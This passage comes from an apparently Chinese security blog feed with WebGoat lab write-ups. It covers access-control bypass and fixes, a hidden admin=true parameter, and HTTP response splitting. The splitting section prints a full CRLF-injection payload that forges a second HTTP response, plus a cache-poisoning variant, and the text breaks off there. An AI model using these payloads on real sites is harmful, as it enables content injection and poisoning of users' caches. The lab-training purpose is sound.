&lt;p&gt;其中有一个handleRequest()函数，这个函数就是用来处理用户操作传过来的请求。其中主要的代码片段为：&lt;br&gt;&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;try&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	DefaultLessonAction action = (DefaultLessonAction) getAction(requestedActionName);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (action != &lt;span class=&quot;keyword&quot;&gt;null&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;comment&quot;&gt;// System.out.println(&quot;RoleBasedAccessControl.handleRequest() dispatching to: &quot; +&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;comment&quot;&gt;// action.getActionName());&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (!action.requiresAuthentication())&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;comment&quot;&gt;// Access to Login does not require authentication.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			action.handleRequest(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;comment&quot;&gt;//***************CODE HERE*************************&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;comment&quot;&gt;//*************************************************&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (action.isAuthenticated(s))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				action.handleRequest(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				&lt;span class=&quot;keyword&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; UnauthenticatedException();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		setCurrentAction(s, ERROR_ACTION);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;就是在“code here”那里添加代码，客户端传到服务器的action如果不为空的话，有两种情况，一种是不需要进行权限验证的，例如登陆操作，另一种是需要进行权限验证的，例如删除，查看等。在这里需要添加我们的一段代码如下：&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(!isAuthorized(s,getUserId(s),requestedActionName)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; UnauthorizedException();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;由于我用的是WebGoat5.2标准版，因此无法实际实施查看效果，只有开发版的才可以。&lt;/p&gt;
&lt;h3 id=&quot;Bypass-Data-Layer-Access-Control&quot;&gt;&lt;a href=&quot;#Bypass-Data-Layer-Access-Control&quot; class=&quot;headerlink&quot; title=&quot;Bypass Data Layer Access Control&quot;&gt;&lt;/a&gt;Bypass Data Layer Access Control&lt;/h3&gt;&lt;p&gt;这里需要绕过数据访问控制层，需要利用Tom的身份越权访问另一名员工的信息。这里同样是通过“ViewProfile”按钮，然后截取修改提交参数的id字段，达到越权访问的目的。&lt;/p&gt;
&lt;h3 id=&quot;Add-Data-Layer-Access-Control&quot;&gt;&lt;a href=&quot;#Add-Data-Layer-Access-Control&quot; class=&quot;headerlink&quot; title=&quot;Add Data Layer Access Control&quot;&gt;&lt;/a&gt;Add Data Layer Access Control&lt;/h3&gt;&lt;p&gt;这一步需要添加数据访问控制层以修复上一步的漏洞。这里需要在与第二步一样的地方，添加如下代码：&lt;br&gt;&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(!action.isAuthorizedForEmployee(s, getUserId(s),s.getParser().getIntParameter(RoleBasedAccessControl.EMPLOYEE_ID, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; UnauthorizedException();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&quot;Remote-Admin-Access&quot;&gt;&lt;a href=&quot;#Remote-Admin-Access&quot; class=&quot;headerlink&quot; title=&quot;Remote Admin Access&quot;&gt;&lt;/a&gt;Remote Admin Access&lt;/h2&gt;&lt;p&gt;远程原理员访问。应用程序通常会有一个管理界面，这个界面一般用户无法访问到，只有具有特权的用户才能访问。很多网站开发人员在脚本中预留了相关的参数接口，一旦该参数被后台程序确认，则访问者的权限会被放大，浏览到先前不能访问的资源，如：程序调试日志、隐藏功能菜单等。在URL里面加上一个参数admin=true，例如：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;http://localhost:8080/WebGoat/attack?Screen=86&amp;amp;menu=200&amp;amp;admin=true&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://localhost:8080/WebGoat/attack?Screen=86&amp;amp;menu=200&amp;amp;admin=true&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这就是URL里面隐藏参数的识别。此时，在左侧栏的“Admin Function”，子功能下增加了另三个功能，如下图所示：&lt;br&gt;&lt;img src=&quot;/images/webgoat_access_control/9.png&quot; alt=&quot;9&quot;&gt;&lt;/p&gt;
&lt;p&gt;然后通过发送请求的时候，在URL上加参数，如下图所示：&lt;br&gt;&lt;img src=&quot;/images/webgoat_access_control/10.png&quot; alt=&quot;10&quot;&gt;&lt;/p&gt;
&lt;p&gt;最后均可成功显示。&lt;/p&gt;
&lt;h2 id=&quot;Summarize&quot;&gt;&lt;a href=&quot;#Summarize&quot; class=&quot;headerlink&quot; title=&quot;Summarize&quot;&gt;&lt;/a&gt;Summarize&lt;/h2&gt;&lt;p&gt;这一节主要讲Web应用程序的访问控制，之前在本科学过访问控制，大概知道有很多种不同类型的访问控制模型。直到今天，才真正理解了访问控制的作用，看来凡事不实际操作，永远只是停留在表层的，继续努力！  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;【版权声明】&lt;/strong&gt;&lt;br&gt;本文首发于&lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;戚名钰的博客&lt;/a&gt;（ &lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;http://qimingyu.github.io/&lt;/a&gt; ），欢迎转载，但是必须保留本文的署名&lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;戚名钰&lt;/a&gt;（包含链接）。如您有任何商业合作或者授权方面的协商，请给我留言：mingyuqi.java@qq.com&lt;br&gt;本文永久链接：&lt;a href=&quot;http://qimingyu.github.io/2016/04/25/Webgoat之Access_Control/&quot;&gt;http://qimingyu.github.io/2016/04/25/Webgoat之Access_Control/&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Using-an-Access-Control-Matrix&quot;&gt;&lt;a href=&quot;#Using-an-Access-Control-Matrix&quot; class=&quot;headerlink&quot; title=&quot;Using an Access Control Matrix&quot;&gt;&lt;/a&gt;Using an Access Control Matrix&lt;/h2&gt;&lt;p&gt;RBAC（Role Based Access Control）模型，基于角色的访问控制模型有三个原则：最小权限原则、责任分离原则和数据抽象原则。不同的人对不同的资源有不同的访问权限。这一步的作用是用来熟悉该站点所使用的访问控制规则，以下是该实验中的不同角色权限：&lt;br&gt;&lt;img src=&quot;/images/webgoat_access_control/8.png&quot; alt=&quot;8&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="应用安全" scheme="http://qimingyu.github.io/categories/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络渗透" scheme="http://qimingyu.github.io/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
    
      <category term="WebGoat" scheme="http://qimingyu.github.io/tags/WebGoat/"/>
    
      <category term="访问控制" scheme="http://qimingyu.github.io/tags/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>WebGoat之Http Splitting攻击</title>
    <link href="http://qimingyu.github.io/2016/04/18/Webgoat%E4%B9%8BHttp_Splitting%E6%94%BB%E5%87%BB/"/>
    <id>http://qimingyu.github.io/2016/04/18/Webgoat之Http_Splitting攻击/</id>
    <published>2016-04-18T01:25:50.000Z</published>
    <updated>2016-04-25T02:26:49.000Z</updated>
    
    <content type="html">&lt;h2 id=&quot;攻击效果与目标&quot;&gt;&lt;a href=&quot;#攻击效果与目标&quot; class=&quot;headerlink&quot; title=&quot;攻击效果与目标&quot;&gt;&lt;/a&gt;攻击效果与目标&lt;/h2&gt;&lt;p&gt;HTTP应答拆分攻击的效果会使用户接收不到正确的服务器回发的信息，而是接收错误的经过伪装的信息，比如挂了马的网页、含有垃圾信息的网页等。采用的是攻击服务器的缓存，所以并不是针对Http服务器的攻击，而是针对具体用户的攻击。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;攻击原理&quot;&gt;&lt;a href=&quot;#攻击原理&quot; class=&quot;headerlink&quot; title=&quot;攻击原理&quot;&gt;&lt;/a&gt;攻击原理&lt;/h2&gt;&lt;p&gt;HTTP请求是基于“请求-响应”的请求，当浏览器发出请求，服务器返回响应，浏览器根据响应再发出请求，依次类推。但有一种服务器端的响应是重定位响应，相应的代码为302，当浏览器收到这个响应的时候，会重新向服务器发送get或者post请求去请求一个新的网页。&lt;/p&gt;
&lt;h2 id=&quot;实战演练&quot;&gt;&lt;a href=&quot;#实战演练&quot; class=&quot;headerlink&quot; title=&quot;实战演练&quot;&gt;&lt;/a&gt;实战演练&lt;/h2&gt;&lt;h3 id=&quot;设置浏览器代理&quot;&gt;&lt;a href=&quot;#设置浏览器代理&quot; class=&quot;headerlink&quot; title=&quot;设置浏览器代理&quot;&gt;&lt;/a&gt;设置浏览器代理&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/images/webgoat_splitting/1.png&quot; alt=&quot;1&quot;&gt;&lt;br&gt;同样burpsuite也要打开8008的侦听端口：&lt;br&gt;&lt;img src=&quot;/images/webgoat_splitting/2.png&quot; alt=&quot;2&quot;&gt;&lt;br&gt;这样就实现了通过burpsuite抓取浏览器的所有数据。&lt;/p&gt;
&lt;h3 id=&quot;漏洞发现&quot;&gt;&lt;a href=&quot;#漏洞发现&quot; class=&quot;headerlink&quot; title=&quot;漏洞发现&quot;&gt;&lt;/a&gt;漏洞发现&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/images/webgoat_splitting/3.png&quot; alt=&quot;3&quot;&gt;&lt;br&gt;这是我们在浏览器端输入“en”，点击go之后，浏览器传输给服务端的请求数据：&lt;br&gt;&lt;img src=&quot;/images/webgoat_splitting/4.png&quot; alt=&quot;4&quot;&gt;&lt;br&gt;可以看到我们的参数“en”传过去了，此时的数据传到了中间代理件burpsuite中，点击forward，burpsuite将这些数据发送给真正的服务器。&lt;br&gt;再继续看服务器传过来的应答：&lt;br&gt;&lt;img src=&quot;/images/webgoat_splitting/5.png&quot; alt=&quot;5&quot;&gt;&lt;br&gt;这是服务器针对这条请求传给浏览器的应答，可见是“302 Move temporarity”表示浏览器端请求的资源被重定向了，需要浏览器再次向服务器发送以后的请求。注意这里服务器传过来的Location：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;http://localhost/WebGoat/attack?Screen=2&amp;amp;menu=100&amp;amp;fromRedirect=yes&amp;amp;language=en&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://localhost/WebGoat/attack?Screen=2&amp;amp;menu=100&amp;amp;fromRedirect=yes&amp;amp;language=en&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我们之前的请求地址是：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;http://localhost/WebGoat/attack?Screen=2&amp;amp;menu=100&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://localhost/WebGoat/attack?Screen=2&amp;amp;menu=100&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;可见我们在前一个页面输入的参数，作为响应被服务器传回来了。&lt;br&gt;由于这是一个302响应，当浏览器接到这个响应时，会根据收到的响应自动再发送一个请求到服务器：&lt;br&gt;&lt;img src=&quot;/images/webgoat_splitting/6.png&quot; alt=&quot;6&quot;&gt;&lt;br&gt;服务器在传回其相应：&lt;br&gt;&lt;img src=&quot;/images/webgoat_splitting/7.png&quot; alt=&quot;7&quot;&gt;&lt;/p&gt;
&lt;p&gt;整个过程存在的漏洞是什么？&lt;/p&gt;
&lt;p&gt;在url编码中，%0d和%0a分别代表回到行首和换行，加起来就是回车的作用。&lt;/p&gt;
&lt;h3 id=&quot;攻击过程&quot;&gt;&lt;a href=&quot;#攻击过程&quot; class=&quot;headerlink&quot; title=&quot;攻击过程&quot;&gt;&lt;/a&gt;攻击过程&lt;/h3&gt;&lt;p&gt;当构造这个字符串输入的时候：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;en%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2047%0d%0a%0d%0a&lt;html&gt;Insert undesireable content here&lt;/html&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;传给服务器端的参数变为了：&lt;br&gt;&lt;img src=&quot;/images/webgoat_splitting/8.png&quot; alt=&quot;8&quot;&gt;&lt;/p&gt;
&lt;p&gt;服务器端的响应变成了：&lt;br&gt;&lt;img src=&quot;/images/webgoat_splitting/9.png&quot; alt=&quot;9&quot;&gt;&lt;/p&gt;
&lt;p&gt;通过解码之后，可知道这个响应实际为：&lt;br&gt;&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;HTTP/1.1 302 Moved Temporarily    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Server: Apache-Coyote/1.1    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Location: http://localhost/WebGoat/attack?Screen=3&amp;amp;menu=100&amp;amp;fromRedirect=yes&amp;amp;language=en    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Content-length: 0    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;HTTP/1.1 200 OK    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Content-Type: text/html;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Content-length: 47    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;insert undersireable content here&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Content-Type: text/html;charset=ISO-8859-1    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Content-length: 0    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Date: Thu, 21 Apr 2016 09:45:28 GMT &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;再与正常的响应进行比较（上图5）：&lt;/p&gt;
&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;HTTP/1.1 302 Moved Temporarily    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Server: Apache-Coyote/1.1    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Location: http://localhost/WebGoat/attack?Screen=3&amp;amp;menu=100&amp;amp;fromRedirect=yes&amp;amp;language=en    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Content-Type: text/html;charset=ISO-8859-1    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Content-length: 0    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Date: Thu, 21 Apr 2016 08:54:24 GMT &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这个响应是服务器端传给浏览器端的，这是一个重定向响应，且Content-length=0，浏览器看到这一行会认为这个重定向响应已经结束了。&lt;/p&gt;
&lt;p&gt;此时浏览器再次发送请求到服务器：&lt;br&gt;&lt;img src=&quot;/images/webgoat_splitting/10.png&quot; alt=&quot;10&quot;&gt;&lt;br&gt;注意这里它的请求地址。&lt;br&gt;最后服务器的响应：&lt;br&gt;&lt;img src=&quot;/images/webgoat_splitting/11.png&quot; alt=&quot;11&quot;&gt;&lt;/p&gt;
&lt;p&gt;需要说明的是，这是因为现在的主流Web服务器比如IIS，Apache HTTP Server以及WebGoat使用的Tomcat等等都有对这个问题作过改进，服务器会对即将发送出去的HTTP响应头里面每一项的值都会做一定的编码或者转换，以避免这个问题。比如Tomcat就响应头中的每一项的值都做过了URLEncode，从而保证即使Web应用存在HTTP应答拆分的漏洞，Web服务器上也从底层平台的角度保证了尽可能避免HTTP应答拆分漏洞带来的威胁。所以如果想要在自己的实验室环境中重现对HTTP应答拆分漏洞的成功利用，可以尝试安装比较老的Web服务器版本，比如Tomcat 4.1.24之前的版本。&lt;/p&gt;
&lt;h3 id=&quot;缓存中毒&quot;&gt;&lt;a href=&quot;#缓存中毒&quot; class=&quot;headerlink&quot; title=&quot;缓存中毒&quot;&gt;&lt;/a&gt;缓存中毒&lt;/h3&gt;&lt;p&gt;我们可以利用这个漏洞进一步进行缓存中毒的攻击，为了做到这一点，我们需要在前面提交的参数中，自己伪造的HTTP响应头中添加一个Last-Modified字段，并且把它的值设为一个未来的值。这样当浏览器在下次请求同一个页面的时候发送If-Modified-Since字段并且这个值是一个未来的值，服务器在发现这个值大于该页面最后修改时间之后将返回HTTP的304响应码表示该页面没有更新过，从而达到了污染受害者缓存的目的。下面就是我们希望的能够污染受害者缓存的服务器响应。我们希望得到的响应是这样的：&lt;br&gt;&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;HTTP/1.1 302 Moved Temporarily    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Server: Apache-Coyote/1.1    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Location: http://localhost/WebGoat/attack?Screen=3&amp;amp;menu=100&amp;amp;fromRedirect=yes&amp;amp;language=en &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Content-length: 0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;HTTP/1.1 200 OK&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Content-Type: 